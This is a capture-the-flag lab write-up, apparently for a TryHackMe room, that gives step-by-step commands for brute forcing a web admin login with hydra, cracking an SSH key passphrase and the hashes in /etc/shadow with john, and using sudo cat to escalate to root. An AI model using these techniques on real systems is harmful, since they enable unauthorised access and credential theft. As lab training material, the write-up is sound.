- **Target IP: 10.10.10.206**
- **Difficulty: Easy**
---

## Reconnaissance

### `nmap` scan:

```bash
nmap -sC -sV 10.10.10.206
```

- **Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

- Looking at the webpage, we are presented with a default Apache web server 

- Testing some , I found that there is a login portal at `http://<IP_ADDRESS>/admin`

- Tried running some default logins (test, test / admin, admin) with no luck

- Inspecting the `/admin` page source revealed the following helpful comment...

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

### `gobuster`

```bash
gobuster dir -u http://10.10.10.206 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

- **Results:**

	- We still are only getting the `admin` directory


## Exploit

- Given the username `admin` we can run a brute force attack using `hydra`

### `hydra`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.206 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V -f
```

- **Result:**

```bash
[80][http-post-form] host: 10.10.10.206   login: admin   password: xavier
```


- I ran into an issue here. When you are testing web apps it is very important to include the trailing slash in the url or you will get wildly different results

- `http://example.com/admin` is **NOT** the same as `http://example.com/admin/`

- After logging into the admin panel, we get a flag `THM{brut3_f0rce_is_e4sy}` and the admins name: `John`

- And an `RSA private key` 

- Save the private key as `id_rsa.pem`

### `ssh2john`

- Convert your private key to a `john` hash:

```bash
ssh2john id_rsa.pem > id_rsa.hash
```

- This is necessary because `john` can only crack the password of a key if it's been converted into a recognizable format — `ssh2john` does this by extracting the encrypted blob for cracking.

### `john`

Run `john` against `id_rsa.hash` with a wordlist:

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

- **Results:**

```bash
rockinroll       (id_rsa.pem) 
```

#### SSH

- From here we can login as admin using SSH with the `id_rsa.pem` file and the pass we just cracked

- However, we still need to change the permissions for the `id_rsa.pem` file

```bash
chmod 600 id_rsa.pem
```

- This sets **read and write permissions for the owner only**
 
- **Breakdown of `600`:**
	- `6` (owner): read (4) + write (2) = 6 
	- `0` (group): no permissions 
	-  `0` (others): no permissions

- This is used for **sensitive files** like private keys — SSH _requires_ that no one else can access your key.

#### SSH Login

```bash
ssh -i id_rsa.pem john@10.10.10.206 
```

- Now that we have a shell as user `john` we can `cat` the `user.txt`:

```bash
cat user.txt
THM{a_password_is_not_a_barrier}
```

### Privilege Escalation

- As always, check `sudo -l`

```bash
User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

- This means that user `john` can run `/bin/cat` as root

```bash
sudo cat /root/root.txt
```

- This will give us our `root.txt` flag:

```bash
THM{pr1v1l3g3_3sc4l4t10n}
```

- We still need to get the pass for `root`. A good place to check for hashed passwords is:

```bash
sudo cat /etc/shadow
```

- `/etc/shadow` stores hashed user passwords. If a user can read it, they can crack root or other users’ passwords offline using tools like `john`.

- Save the list locally to a file `hashes`

- Run `john` against the list of hashes to obtain the pass for `root`

```bash
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

- **Result:**

```bash
football         (root)
```

- Finally `su` to `root` and use the pass we just obtained

```bash
root@bruteit:~# whoami
root
```

---

## Lessons Learned

- Always inspect source code and comments on web pages — they often leak useful hints.
- Brute-forcing web logins with `hydra` requires understanding the form structure and failure conditions.
- Reading `/etc/shadow` is a serious privilege — cracking root hashes is often faster than complex privilege escalation exploits.
- When using SSH private keys, always remember `chmod 600` or SSH will reject them.


[[CTF Notes]]








